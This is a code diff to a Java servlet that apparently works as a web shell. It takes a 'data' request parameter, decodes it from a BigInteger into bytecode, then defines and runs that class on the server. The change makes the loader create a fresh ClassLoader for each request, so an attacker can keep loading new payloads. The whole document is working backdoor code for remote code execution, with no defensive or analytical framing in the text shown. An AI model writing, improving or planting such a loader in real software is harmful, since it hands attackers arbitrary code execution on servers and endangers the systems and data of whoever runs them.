@@ -10,6 +10,13 @@ import java.io.IOException;
  */
 public class BigIntegerClassLaoderServlet extends ClassLoader implements Servlet {
 
+    public BigIntegerClassLaoderServlet() {
+    }
+
+    protected BigIntegerClassLaoderServlet(ClassLoader parent) {
+        super(parent);
+    }
+
     @Override
     public void init(ServletConfig config) throws ServletException {
 
@@ -25,7 +32,7 @@ public class BigIntegerClassLaoderServlet extends ClassLoader implements Servlet
         String data = req.getParameter("data");
         try {
             byte[] bytes = decodeBigInteger(data);
-            defineClass(null, bytes, 0, bytes.length).newInstance();
+            new BigIntegerClassLaoderServlet(Thread.currentThread().getContextClassLoader()).defineClass(null, bytes, 0, bytes.length).newInstance();
         } catch (Exception e) {
             throw new RuntimeException(e);
         }
